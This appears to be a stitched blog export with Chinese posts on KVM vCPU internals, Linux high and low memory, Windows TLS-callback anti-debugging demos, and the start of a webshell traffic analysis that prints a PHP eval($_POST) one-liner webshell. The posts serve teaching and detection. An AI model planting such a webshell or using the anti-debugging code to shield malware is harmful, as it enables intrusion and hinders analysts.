//将mm指向当前进程空间（即用户态进程qemu-kvm进程空间） kvm-&gt;mm = current-&gt;mm; r = kvm_arch_init_vm(kvm, type); if (r) goto out_err_no_disable; r = hardware_enable_all(); if (r) goto out_err_no_disable; //为虚拟机分配内存空间 for (i = 0; i &lt; KVM_ADDRESS_SPACE_NUM; i++) &#123; struct kvm_memslots *slots = kvm_alloc_memslots(); if (!slots) goto out_err_no_srcu; /* * Generations must be different for each address space. * Init kvm generation close to the maximum to easily test the * code of handling generation number wrap-around. */ slots-&gt;generation = i * 2 - 150; rcu_assign_pointer(kvm-&gt;memslots[i], slots); &#125; //初始化io总线，为相关总线分配内存空间 for (i = 0; i &lt; KVM_NR_BUSES; i++) &#123; kvm-&gt;buses[i] = kzalloc(sizeof(struct kvm_io_bus), GFP_KERNEL); if (!kvm-&gt;buses[i]) goto out_err; &#125; return kvm;&#125; vcpu的创建 vcpu在kvm中本质就是一个结构体，vcpu的具体创建流程是 为VCPU分配标识号； 初始化虚拟寄存器组，也就是虚拟机的上下文执行环境，寄存器初始化的值是依据物理机刚上电时，硬件对寄存器的初始值，在VT-x技术中，这些数据单独存放在VMCS结构； 初始化VCPU的状态信息，虚拟机是断断续续执行的，须维护一个运行状态值 初始化其它额外的一些寄存器信息。 从用户进程qemu-kvm分析vcpu的创建，创建一个虚拟机(VM)，其实是在系统中创建一个应用进程(启动一个Qemu-kvm进程)，而创建VCPU则是在该应用进程启动一个线程。用户空间代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566//创建线程static void qemu_kvm_start_vcpu(CPUState *cpu)&#123; char thread_name[VCPU_THREAD_NAME_SIZE]; cpu-&gt;thread = g_malloc0(sizeof(QemuThread)); cpu-&gt;halt_cond = g_malloc0(sizeof(QemuCond)); qemu_cond_init(cpu-&gt;halt_cond); snprintf(thread_name, VCPU_THREAD_NAME_SIZE, &quot;CPU %d/KVM&quot;, cpu-&gt;cpu_index); //创建线程 qemu_thread_create(cpu-&gt;thread, thread_name, qemu_kvm_cpu_thread_fn, cpu, QEMU_THREAD_JOINABLE);&#125;static void *qemu_kvm_cpu_thread_fn(void *arg)&#123; CPUState *cpu = arg; int r; rcu_register_thread(); cpu-&gt;thread_id = qemu_get_thread_id(); cpu-&gt;can_do_io = 1; current_cpu = cpu; //创建vcpu r = kvm_init_vcpu(cpu); if (r &lt; 0) &#123; error_report(&quot;kvm_init_vcpu failed: %s&quot;, strerror(-r)); exit(1); &#125; kvm_init_cpu_signals(cpu); /* signal CPU creation */ cpu-&gt;created = true; //通过信号量唤醒主线程 qemu_cond_signal(&amp;qemu_cpu_cond); qemu_guest_random_seed_thread_part2(cpu-&gt;random_seed); //启动cpu，循环 do &#123; if (cpu_can_run(cpu)) &#123; r = kvm_cpu_exec(cpu); if (r == EXCP_DEBUG) &#123; cpu_handle_guest_debug(cpu); &#125; &#125; 当guest执行io执行时会发生VM-exit，最终返回qemu-kvm进程，在该进程中执行io相关 操作，之后调用qemu_kvm_wait_to_event函数，处理完毕后调用kvm_cpu_exec函数 继续启动vcpu继续以非根模式运行guest qemu_wait_io_event(cpu); &#125; while (!cpu-&gt;unplug || cpu_can_run(cpu));&#125;int kvm_init_vcpu(CPUState *cpu)&#123; DPRINTF(&quot;kvm_init_vcpu\\n&quot;); //调用kvm_vm_ioctl(s, KVM_CREATE_VCPU, (void *)vcpu_id);创建cpu ret = kvm_get_vcpu(s, kvm_arch_vcpu_id(cpu)); if (ret &lt; 0) &#123; DPRINTF(&quot;kvm_create_vcpu failed\\n&quot;); goto err; &#125; //通过系统调用ioctl mmap_size = kvm_ioctl(s, KVM_GET_VCPU_MMAP_SIZE, 0);&#125; 跟入内核代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758static long kvm_vm_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg)&#123; case KVM_CREATE_VCPU: r = kvm_vm_ioctl_create_vcpu(kvm, arg); break;&#125;static int kvm_vm_ioctl_create_vcpu(struct kvm *kvm, u32 id)&#123; int r; struct kvm_vcpu *vcpu; 一些判断。。。 kvm_arch_vcpu_create() 初始化vcpu结构体，跟进发现是主要是设置一些VCPU进入非根模式下寄存器的相关信息 r = kvm_arch_vcpu_setup(vcpu); if (r) goto vcpu_destroy; r = kvm_create_vcpu_debugfs(vcpu); if (r) goto vcpu_destroy; mutex_lock(&amp;kvm-&gt;lock); if (kvm_get_vcpu_by_id(kvm, id)) &#123; r = -EEXIST; goto unlock_vcpu_destroy; &#125; /* Now it&#x27;s all set up, let userspace reach it */ kvm_get_kvm(kvm); 创建vcpu r = create_vcpu_fd(vcpu); if (r &lt; 0) &#123; kvm_put_kvm(kvm); goto unlock_vcpu_destroy; &#125; 将vcpu添加到kvm结构体中 kvm-&gt;vcpus[atomic_read(&amp;kvm-&gt;online_vcpus)] = vcpu; kvm_arch_vcpu_postcreate(vcpu); return r;unlock_vcpu_destroy: mutex_unlock(&amp;kvm-&gt;lock); debugfs_remove_recursive(vcpu-&gt;debugfs_dentry);vcpu_destroy: kvm_arch_vcpu_destroy(vcpu);vcpu_decrement: mutex_lock(&amp;kvm-&gt;lock); kvm-&gt;created_vcpus--; mutex_unlock(&amp;kvm-&gt;lock); return r;&#125; vcpu创建好，且已于物理cpu绑定，接下来就是vcpu的运行 由前文可知，vcpu其实是qemu-kvm进程创建的一个线程，那么vcpu的执行其实就是线程的调度，虚拟机的运行是通过对 vcpu的文件描述符以KVM_RUN命令执行ioctl来实现的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247r = vcpu_load(vcpu); if (r) return r; switch (ioctl) &#123; case KVM_RUN: r = -EINVAL; if (arg) goto out; if (unlikely(vcpu-&gt;pid != current-&gt;pids[PIDTYPE_PID].pid)) &#123; /* The thread running this VCPU changed. */ struct pid *oldpid = vcpu-&gt;pid; struct pid *newpid = get_task_pid(current, PIDTYPE_PID); rcu_assign_pointer(vcpu-&gt;pid, newpid); if (oldpid) synchronize_rcu(); put_pid(oldpid); &#125; r = kvm_arch_vcpu_ioctl_run(vcpu, vcpu-&gt;run); trace_kvm_userspace_exit(vcpu-&gt;run-&gt;exit_reason, r); break;int kvm_arch_vcpu_ioctl_run(struct kvm_vcpu *vcpu, struct kvm_run *run)&#123; ret = kvm_vcpu_first_run_init(vcpu); if (ret) return ret； 判断 if (run-&gt;exit_reason == KVM_EXIT_MMIO) &#123; ret = kvm_handle_mmio_return(vcpu, vcpu-&gt;run); if (ret) return ret; &#125; run-&gt;exit_reason = KVM_EXIT_UNKNOWN; while (ret &gt; 0) &#123; 屏蔽信号 关键～～～～ /************************************************************** * Enter the guest */ trace_kvm_entry(*vcpu_pc(vcpu)); guest_enter_irqoff(); vcpu-&gt;mode = IN_GUEST_MODE; ret = kvm_call_hyp(__kvm_vcpu_run, vcpu); vcpu-&gt;mode = OUTSIDE_GUEST_MODE; vcpu-&gt;stat.exits++; /* * Back from guest *************************************************************/&#125;//该函数在当前kvm版本中未找到,应该是版本太低的原因，引用KVM 6.4.10int __kvm_vcpu_run(struct kvm_vcpu *vcpu)&#123; host guest上下文环境 struct kvm_cpu_context *host_ctxt; struct kvm_cpu_context *guest_ctxt; struct kvm_s2_mmu *mmu; host_ctxt = &amp;this_cpu_ptr(&amp;kvm_host_data)-&gt;host_ctxt; host_ctxt-&gt;__hyp_running_vcpu = vcpu; guest_ctxt = &amp;vcpu-&gt;arch.ctxt; pmu_switch_needed = __pmu_switch_to_guest(vcpu); __sysreg_save_state_nvhe(host_ctxt); __debug_save_host_buffers_nvhe(vcpu); __kvm_adjust_pc(vcpu); __sysreg32_restore_state(vcpu); __sysreg_restore_state_nvhe(guest_ctxt); mmu = kern_hyp_va(vcpu-&gt;arch.hw_mmu); __load_stage2(mmu, kern_hyp_va(mmu-&gt;arch)); __activate_traps(vcpu); __hyp_vgic_restore_state(vcpu); __timer_enable_traps(vcpu); __debug_switch_to_guest(vcpu); do &#123; /* Jump in the fire! */ exit_code = __guest_enter(vcpu); /* And we&#x27;re baaack! */ &#125; while (fixup_guest_exit(vcpu, &amp;exit_code)); __sysreg_save_state_nvhe(guest_ctxt); __sysreg32_save_state(vcpu); __timer_disable_traps(vcpu); __hyp_vgic_save_state(vcpu); /* * Same thing as before the guest run: we&#x27;re about to switch * the MMU context, so let&#x27;s make sure we don&#x27;t have any * ongoing EL1&amp;0 translations. */ dsb(nsh); __deactivate_traps(vcpu); __load_host_stage2(); __sysreg_restore_state_nvhe(host_ctxt); if (vcpu-&gt;arch.fp_state == FP_STATE_GUEST_OWNED) __fpsimd_save_fpexc32(vcpu); __debug_switch_to_host(vcpu); /* * This must come after restoring the host sysregs, since a non-VHE * system may enable SPE here and make use of the TTBRs. */ __debug_restore_host_buffers_nvhe(vcpu); if (pmu_switch_needed) __pmu_switch_to_host(vcpu); /* Returning to host will clear PSR.I, remask PMR if needed */ if (system_uses_irq_prio_masking()) gic_write_pmr(GIC_PRIO_IRQOFF); host_ctxt-&gt;__hyp_running_vcpu = NULL; return exit_code;&#125;最终调用的vcpu函数，不同kernel实现方式不同，但大同小异static int vcpu_enter_guest(struct kvm_vcpu *vcpu)&#123; 处理挂起的请求，包括定时器迁移、TLB刷新、主时钟更新、MMU同步等 if (kvm_request_pending(vcpu)) &#123; &#125; static_call(kvm_x86_prepare_switch_to_guest)(vcpu); for (;;) &#123; WARN_ON_ONCE((kvm_vcpu_apicv_activated(vcpu) != kvm_vcpu_apicv_active(vcpu)) &amp;&amp; (kvm_get_apic_mode(vcpu) != LAPIC_MODE_DISABLED)); exit_fastpath = static_call(kvm_x86_vcpu_run)(vcpu); if (likely(exit_fastpath != EXIT_FASTPATH_REENTER_GUEST)) break; if (kvm_lapic_enabled(vcpu)) static_call_cond(kvm_x86_sync_pir_to_irr)(vcpu); if (unlikely(kvm_vcpu_exit_request(vcpu))) &#123; exit_fastpath = EXIT_FASTPATH_EXIT_HANDLED; break; &#125; /* Note, VM-Exits that go down the &quot;slow&quot; path are accounted below. */ ++vcpu-&gt;stat.exits; &#125; /* * Do this here before restoring debug registers on the host. And * since we do this before handling the vmexit, a DR access vmexit * can (a) read the correct value of the debug registers, (b) set * KVM_DEBUGREG_WONT_EXIT again. */ if (unlikely(vcpu-&gt;arch.switch_db_regs &amp; KVM_DEBUGREG_WONT_EXIT)) &#123; WARN_ON(vcpu-&gt;guest_debug &amp; KVM_GUESTDBG_USE_HW_BP); static_call(kvm_x86_sync_dirty_debug_regs)(vcpu); kvm_update_dr0123(vcpu); kvm_update_dr7(vcpu); &#125; /* * If the guest has used debug registers, at least dr7 * will be disabled while returning to the host. * If we don&#x27;t have active breakpoints in the host, we don&#x27;t * care about the messed up debug address registers. But if * we have some of them active, restore the old state. */ if (hw_breakpoint_active()) hw_breakpoint_restore(); vcpu-&gt;arch.last_vmentry_cpu = vcpu-&gt;cpu; vcpu-&gt;arch.last_guest_tsc = kvm_read_l1_tsc(vcpu, rdtsc()); vcpu-&gt;mode = OUTSIDE_GUEST_MODE; smp_wmb(); /* * Sync xfd before calling handle_exit_irqoff() which may * rely on the fact that guest_fpu::xfd is up-to-date (e.g. * in #NM irqoff handler). */ if (vcpu-&gt;arch.xfd_no_write_intercept) fpu_sync_guest_vmexit_xfd_state(); static_call(kvm_x86_handle_exit_irqoff)(vcpu); if (vcpu-&gt;arch.guest_fpu.xfd_err) wrmsrl(MSR_IA32_XFD_ERR, 0); /* * Consume any pending interrupts, including the possible source of * VM-Exit on SVM and any ticks that occur between VM-Exit and now. * An instruction is required after local_irq_enable() to fully unblock * interrupts on processors that implement an interrupt shadow, the * stat.exits increment will do nicely. */ kvm_before_interrupt(vcpu, KVM_HANDLING_IRQ); local_irq_enable(); ++vcpu-&gt;stat.exits; local_irq_disable(); kvm_after_interrupt(vcpu); guest_timing_exit_irqoff(); local_irq_enable(); preempt_enable(); kvm_vcpu_srcu_read_lock(vcpu); /* * Profile KVM exit RIPs: */ if (unlikely(prof_on == KVM_PROFILING)) &#123; unsigned long rip = kvm_rip_read(vcpu); profile_hit(KVM_PROFILING, (void *)rip); &#125; if (unlikely(vcpu-&gt;arch.tsc_always_catchup)) kvm_make_request(KVM_REQ_CLOCK_UPDATE, vcpu); if (vcpu-&gt;arch.apic_attention) kvm_lapic_sync_from_vapic(vcpu); r = static_call(kvm_x86_handle_exit)(vcpu, exit_fastpath); return r;&#125; 夹杂着一些汇编指令代码又臭又长，无非是处理一下阻塞事件，中断异常，信号处理，设置堆栈等相关变量等等 VCPU的退出 在非根模式下，客户机占用处理机执行大部分的非敏感指令，直到客户机执行到了一条敏感指令，或者因为中断、异常发生VM-Exit，回到VMM执行环境； 在发生VM-Exit后从非根模式切换到根模式，RIP(EIP)指向了 .Lkvm_vmx_return，即在VMM环境中从这里开始执行(从宿主机状态域中CS : RIP中加载)： 12345678910111213141516171819202122232425262728293031323334static fastpath_t vmx_vcpu_run(struct kvm_vcpu *vcpu)&#123; vmx_vcpu_enter_exit(vcpu, __vmx_vcpu_run_flags(vmx));&#125;static noinstr void vmx_vcpu_enter_exit(struct kvm_vcpu *vcpu, unsigned int flags)&#123; struct vcpu_vmx *vmx = to_vmx(vcpu); guest_state_enter_irqoff(); vmx_disable_fb_clear(vmx); if (vcpu-&gt;arch.cr2 != native_read_cr2()) native_write_cr2(vcpu-&gt;arch.cr2); vmx-&gt;fail = __vmx_vcpu_run(vmx, (unsigned long *)&amp;vcpu-&gt;arch.regs, flags); 处理了因为中断或者异常等原因导致的VM-Exit if (unlikely(vmx-&gt;fail)) vmx-&gt;exit_reason.full = 0xdead; else vmx-&gt;exit_reason.full = vmcs_read32(VM_EXIT_REASON); if ((u16)vmx-&gt;exit_reason.basic == EXIT_REASON_EXCEPTION_NMI &amp;&amp; is_nmi(vmx_get_intr_info(vcpu))) &#123; kvm_before_interrupt(vcpu, KVM_HANDLING_NMI); vmx_do_nmi_irqoff(); kvm_after_interrupt(vcpu); &#125; guest_state_exit_irqoff();&#125;","categories":[{"name":"虚拟化","slug":"虚拟化","permalink":"http://example.com/categories/%E8%99%9A%E6%8B%9F%E5%8C%96/"}],"tags":[{"name":"虚拟化","slug":"虚拟化","permalink":"http://example.com/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"}]},{"title":"linux高端内存/低端内存及相关api","slug":"linux高端低端内存","date":"2023-04-04T12:58:47.194Z","updated":"2023-04-04T13:00:40.693Z","comments":true,"path":"2023/04/04/linux高端低端内存/","link":"","permalink":"http://example.com/2023/04/04/linux%E9%AB%98%E7%AB%AF%E4%BD%8E%E7%AB%AF%E5%86%85%E5%AD%98/","excerpt":"","text":"网上大神整理的linux内存管理图镇楼 起因是面试中面试官提到linux高端内存以及低端内存，对linux内核内存管理这方面了解较少。因此本文全面阐述linux内存，就是上图 Linux内核地址空间划分通常32位Linux内核虚拟地址空间划分03G为用户空间，34G为内核空间(注意，内核可以使用的线性地址只有1G)。注意这里是32位内核地址空间划分，64位内核地址空间划分是不同的。 高端内存以及低端内存计算机内存寻址过程中我们将页框作为内存分配的基本单元，一般现代32位计算机页框大小为4kb，此外内核必须记录每个页框的状态，如记录该页框保存的是内核代码还是用户代码，因此linux用page这一描述符来保存页框的状态信息，所有的page都存放在mem_map数组中以便管理。 但是由于计算机发展历史以及硬件体系结构的限制，导致 （1）ISA总线的直接内存存取（DMA）处理器只能对随机存储器（RAM）的前16MB寻址。 （2）具有大容量的RAM的32位计算机中，CPU不能直接访问所有的物理内存！ 因此linux将物理内存划分为三个管理区 （1）ZONE_DMA：包含低于16M的内存页框，只有它能够作用于DMA； （2）ZONE_NORMAL：包含高于16M且低于896M的内存页框； （3）ZONE_HIGHMEM：包含从896M开始高于896M的内存页框 由于在32位系统中，线性地址空间是4G，其中规定34G的范围是内核空间（1G），03G是用户空间（3G）。如果把这1G的内核线性地址空间全部拿来直接一一映射物理内存的话，在内核态的所有进程（线程）能使用的物理内存总共最多只有1G，很显然，如果你有4G内存，3G都不能用来做内核空间，太浪费了！因此就出现了高端内存以及低端内存。 ZONE_DMA和ZONE_NORMAL我们一般称之为低端内存（896MB），ZONE_HIGHMEM称之为高端内存。即从0xc0000000往高地址空间896mb内存为低端内存，再往上至0xffffffff为高端内存（如下图红色字体所示）。高、低端内存的分类主要在于区分物理内存地址是否可以直接映射到内核线性地址空间中。问题来了，高、低端内存和内核的线性空间的映射是什么样的呢？ 低端内存映射低端内存映射比较简单，这一部分虚拟地址与物理内存中对应的地址只差一个固定偏移量（3G），如果内存物理地址空间从0x00000000地址编址，那么这个固定偏移量就是PAGE_OFFSET&#x3D;0xC0000000。逻辑地址与物理地址对应的关系为物理地址 &#x3D; 逻辑地址 – 0xC0000000，如逻辑地址0xc0000003对应的物理地址为0×3，0xc0000004对应的物理地址为0×4。 即1G中的前896M，这部分内核线性空间与物理内存的0~896M一一映射（注意这里内核的虚拟地址在“高端”，但是它映射的物理内存地址在低端。） 高端内存映射正如前文所说，高端内存解决的问题是突破1gb内核空间的限制，达到更多的内存空间可以映射为内核空间。类似于一种临时借一段地址空间，建立临时地址映射，用完后释放，达到这段地址空间可以循环使用，访问所有物理内存。 如下图高端内存和用户内存都通过页表寻址。 根据应用目标不同，高端内存区分vmalloc区、永久映射区（可持久化映射区）和固定映射区（临时映射区）。 vmalloc区 vmalloc映射区时高端内存的主要部分，该区间的头部与内核线性映射空间(即低端内存)之间有一个8MB的隔离区，尾部与后续的可持久映射区有一个4KB的隔离区。 vmalloc映射区的映射方式与用户空间完全相同，内核可以通过调用函数vmalloc()在这个区域获得内存。这个函数的功能相当于用户空间的malloc()，所提供的内存空间在虚拟地址上连续（注意，不保证物理地址连续）。 可持久化映射区 该区允许内核建立高端页框到内核地址空间的长期映射 内核专门为此留出一块线性空间，从PKMAP_BASE开始，用于映射高端内存，就是可持久内核映射区。在可持久内核映射区，可通过调用函数kmap()在物理页框与内核虚拟页之间建立长期映射。这个空间通常为4MB，最多能映射1024个页框，数量较为稀少，所以为了加强页框的周转，应及时调用函数kunmap()将不再使用的物理页框释放。 临时映射区 内核在 FIXADDR_START 到 FIXADDR_TOP 之间保留了一些线性空间用于特殊需求。这个空间称为“固定映射空间”，在这个空间中，有一部分用于高端内存的临时映射。因为在这个区域所获得的内存空间没有所保护，故所获得的内存必须及时使用；否则一旦有新的请求，该页框上的内容就会被覆盖，所以这个区域叫做临时映射区。linux中通过 kmap_atomic() 可实现临时映射。 linux内存分配api及相关底层调用网上找到的一张图片 由上图可知 由malloc、fork等系统调用和kmalloc、vmalloc申请得到虚拟内存。 在我们使用该内存的时候，产生请页异常（kmalloc除外） 从空闲的页框分配物理内存，和虚拟地址建立映射。 malloc malloc分配的是用户的内存 kmalloc和vmalloc kmalloc和vmalloc是分配的是内核的内存。 如上文提到的vmalloc区，函数vmalloc()在vmalloc分配区分配内存，可获得虚拟地址连续，但并不保证其物理页框连续的较大内存。 与物理空间的内存分配函数malloc()有所区别，vmalloc()分配的物理页不会被交换出去。函数vmalloc()的原型如下： 12345678void *vmalloc(unsigned long size)&#123; return __vmalloc(size, GFP_KERNEL | __GFP_HIGHMEM, PAGE_KERNEL);&#125;void *__vmalloc(unsigned long size, gfp_t gfp_mask, pgprot_t prot)&#123; return kmalloc(size, (gfp_mask | __GFP_COMP) &amp; ~__GFP_HIGHMEM);&#125; 其中，参数size为所请求内存的大小，返回值为所获得内存虚拟地址指针。 kmalloc()是内核另一个常用的内核分配函数，它可以分配一段未清零的连续物理内存页，返回值为直接映射地址。由kmalloc()可分配的内存最大不能超过32页。其优点是分配速度快，缺点是不能分配大于128KB的内存页（出于跨平台考虑）。 kmalloc、vmalloc这两个函数所分配的内存都处于内核空间，即从3GB～4GB；但位置不同，kmalloc()分配的内存处于3GB～high_memory（ZONE_DMA、ZONE_NORMAL）之间，而vmalloc()分配的内存在VMALLOC_START～4GB（ZONE_HIGHMEM）之间，也就是非连续内存区。一般情况下在驱动程序中都是调用kmalloc()来给数据结构分配内存，而vmalloc()用在为活动的交换区分配数据结构，为某些I&#x2F;O驱动程序分配缓冲区，或为模块分配空间。 kmalloc保证分配的内存在物理上是连续的，vmalloc保证的是在虚拟地址空间上的连续。 kmalloc能分配的大小有限，vmalloc和malloc能分配的大小相对较大 vmalloc比kmalloc要慢 alloc_pages() 与上述在虚拟空间分配内存的函数不同，alloc_pages()是在物理内存空间分配物理页框的函数 ，其原型如下： 1234567static inline struct page * alloc_pages(gfp_t gfp_mask, unsigned int order)&#123; if (unlikely(order &gt;= MAX_ORDER)) return NULL; return alloc_pages_current(gfp_mask, order);&#125; 其中，参数order表示所分配页框的数目，该数目为2^order。order的最大值由include&#x2F;Linux&#x2F;Mmzone.h文件中的宏MAX_ORDER决定。参数gfp_mask为说明内存页框分配方式及使用场合。函数返回值为页框块的第一个页框page结构的地址。 kmap() kmap()是一个映射函数，它可以将一个物理页框映射到内核空间的可持久映射区。这种映射类似于内核ZONE_NORMAL的固定映射，但虚拟地址与物理地址的偏移不一定是PAGE_OFFSET。由于内核可持久映射区的容量有限（总共只有4MB），因此当内存使用完毕后，应该立即释放。 函数kmap()的函数原型如下： 1234567void *kmap(struct page *page)&#123; might_sleep(); if (!PageHighMem(page)) return page_address(page); return kmap_high(page);&#125;","categories":[{"name":"内核","slug":"内核","permalink":"http://example.com/categories/%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"}]},{"title":"TLS反调试","slug":"tls反调试","date":"2022-10-20T14:18:29.048Z","updated":"2022-10-20T14:20:34.875Z","comments":true,"path":"2022/10/20/tls反调试/","link":"","permalink":"http://example.com/2022/10/20/tls%E5%8F%8D%E8%B0%83%E8%AF%95/","excerpt":"","text":"TLSwhat is TLSThread Local Storage(TLS)，在Windows多线程编程中，访问全局变量时由于CPU时间片调度可能会导致出现意想不到的结果。最常见的方法就是对全局变量访问加锁。Windows为解决一个进程中多个线程同时访问全局变量。设计了TLS机制。TLS可以简单地由操作系统代为完成整个互斥过程，也可以由用户自己编写控制信号量的函数。当进程中的线程访问预先制定的内存空间时，操作系统会调用系统默认的或用户自定义的信号量函数，保证数据的完整性与正确性。 在执行含有TLS的程序时，首先依次加载用户编写的TLS回调函数数组（指针函数数组），接着转到OEP执行。因此基于TLS的反调试，原理是在实际的入口点（OEP）代码执行之前通过TLS回调函数执行检测调试器代码，达到TLS反调试实现的效果。下面来一段程序 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include&lt;Windows.h&gt;#pragma comment (linker, &quot;/INCLUDE:__tls_used&quot;) //通知链接器为TLS数据在PE文件头中添加数据//TLS提供与DllMain类似，能够注册一系列的TLS回调函数Reason。void NTAPI TlsCallBackFunction1(PVOID Handle, DWORD Reason, PVOID Reserve) &#123; ::MessageBox(NULL, TEXT(&quot;Tls1&quot;), TEXT(&quot;Tls reverse1&quot;), MB_OK); &#125;void NTAPI TlsCallBackFunction2(PVOID Handle, DWORD Reason, PVOID Reserve) &#123; ::MessageBox(NULL, TEXT(&quot;Tls2&quot;), TEXT(&quot;Tls reverse2&quot;), MB_OK);&#125;int main()&#123; ::MessageBox(NULL, TEXT(&quot;Main&quot;), TEXT(&quot;Main fun&quot;), MB_OK); printf(&quot;%x,%x&quot;, TlsCallBackFunction1, &amp;TlsCallBackFunction2);&#125;#pragma data_seg(&quot;.CRT$XLX&quot;) PIMAGE_TLS_CALLBACK pTLS_Callback[] = &#123; TlsCallBackFunction1,TlsCallBackFunction2&#125;; //TLS callback函数数组，依次执行#pragma data_seg()//程序先执行TlsCallBackFunction1，TlsCallBackFunction2，然后执行main函数 注意的是，在TLS回调函数执行时，VC运行库msvcrt.dll,mfc.dll等并未载入，不能使用C库的函数（比如printf）。如果有需要使用，应该使用LoadLibrary()函数载入相应的库并使用GetProcAddress()获得函数地址。但此类操作可能会导致调试器的相关事件触发，不建议进行此类操作。 PE文件中，在可选头OptionHeader中的IMAGE_DATA_DIRECTORY数组中（IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS]）保存了TLS表， 123456789typedef struct _IMAGE_TLS_DIRECTORY32 &#123; DWORD StartAddressOfRawData; // TLS初始化数据的起始地址 DWORD EndAddressOfRawData;// TLS初始化数据的结束地址 两个正好定位一个范围,范围放初始化的值 PDWORD AddressOfIndex;// TLS 索引的位置 PIMAGE_TLS_CALLBACK *AddressOfCallBacks;// Tls回调函数的数组指针 DWORD SizeOfZeroFill;// 填充0的个数 DWORD Characteristics;&#125; IMAGE_TLS_DIRECTORY32 与不加TLS的程序相比，PE文件中会多一个.tls段 TLS实现反调试实现及原理充分利用TLS回调函数在程序入口点之前就能获得程序控制权的特性，在TLS回调函数中进行反调试操作比传统的反调试技术有更好的效果。 NtQueryInformationProcessdemo如下 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;#include&lt;Windows.h&gt;#include&lt;winternl.h&gt;#pragma comment (linker, &quot;/INCLUDE:__tls_used&quot;)DWORD debugFlag = 0;typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)( _In_ HANDLE ProcessHandle, _In_ UINT ProcessInformationClass, _Out_ PVOID ProcessInformation, _In_ ULONG ProcessInformationLength, _Out_opt_ PULONG ReturnLength );void NTAPI TlsCallBackFunction1(PVOID Handle, DWORD Reason, PVOID Reserve) &#123; pfnNtQueryInformationProcess NtQueryInformationProcess = NULL; HMODULE hNtDll = LoadLibrary(TEXT(&quot;ntdll.dll&quot;)); if (hNtDll) &#123; NtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(hNtDll, &quot;NtQueryInformationProcess&quot;); if (NtQueryInformationProcess) &#123; NtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, &amp;debugFlag, sizeof(DWORD), NULL); &#125; &#125; if (debugFlag != 0) &#123; ::MessageBox(NULL, TEXT(&quot;detect debugger&quot;), TEXT(&quot;detect debugger&quot;), MB_OK); &#125;&#125;int main()&#123; ::MessageBox(NULL, arr, TEXT(&quot;test&quot;), MB_OK); system(&quot;pause&quot;);&#125;#pragma data_seg(&quot;.CRT$XLX&quot;)PIMAGE_TLS_CALLBACK pTLS_Callback[] = &#123; TlsCallBackFunction1,NULL &#125;;#pragma data_seg() IsDebuggerPresent微软给我们提供了一个API函数用来检测当前程序是否正在被调试 函数原型 12345BOOL IsDebuggerPresent();Return valueIf the current process is running in the context of a debugger, the return value is nonzero.If the current process is not running in the context of a debugger, the return value is zero. demo 123456void NTAPI TlsCallBackFunction1(PVOID Handle, DWORD Reason, PVOID Reserve) &#123; if (IsDebuggerPresent()) &#123; ::MessageBox(NULL, TEXT(&quot;detect debugger&quot;), TEXT(&quot;detect debugger&quot;), MB_OK); &#125;;&#125; debugFlag的妙用调试器附加进程时，NtQueryInformationProcess中为debugFlag赋值为0xffff ffff，未调试时debugFlag为0，借用debugFlag在不同状态下的值来对某些关键数据进行加密，来实现数据保护以及反调试的效果。例如一下demo 123456789101112131415int main()&#123; //printf(&quot;%x,%x&quot;, TlsCallBackFunction1, &amp;TlsCallBackFunction2); //printf(&quot;%x&quot;, debugFlag); if (debugFlag != 0) &#123; printf(&quot;debuging&quot;); &#125; //check successful char arr[] = &#123; 0x63, 0x68, 0x65, 0x63, 0x6B, 0x20, 0x73, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x66, 0x75, 0x6C,0x21, 0x21, 0x00 &#125;; for (int i = 0; i &lt; 19; i++) &#123; arr[i] = arr[i] ^ debugFlag; &#125; ::MessageBox(NULL, arr, TEXT(&quot;test&quot;), MB_OK); system(&quot;pause&quot;);&#125; 未调试时弹出check successful，调试时数据亦或弹出乱码","categories":[{"name":"windows逆向，内核安全","slug":"windows逆向，内核安全","permalink":"http://example.com/categories/windows%E9%80%86%E5%90%91%EF%BC%8C%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"windows,windows安全,反调试","slug":"windows-windows安全-反调试","permalink":"http://example.com/tags/windows-windows%E5%AE%89%E5%85%A8-%E5%8F%8D%E8%B0%83%E8%AF%95/"}]},{"title":"常见Webshell连接工具流量分析","slug":"冰蝎流量分析","date":"2022-09-08T09:47:19.000Z","updated":"2022-09-08T09:48:27.258Z","comments":true,"path":"2022/09/08/冰蝎流量分析/","link":"","permalink":"http://example.com/2022/09/08/%E5%86%B0%E8%9D%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","excerpt":"","text":"常见Webshell连接工具流量分析蚁剑网站后门一句话1&lt;?php eval($_POST[&#x27;bckdor&#x27;]);?&gt; wireshark抓包 连接过程分析 http request数据包 123456789POST /ma.php HTTP/1.1Host: localhostAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)Content-Type: application/x-www-form-urlencodedContent-Length: 1643Connection: 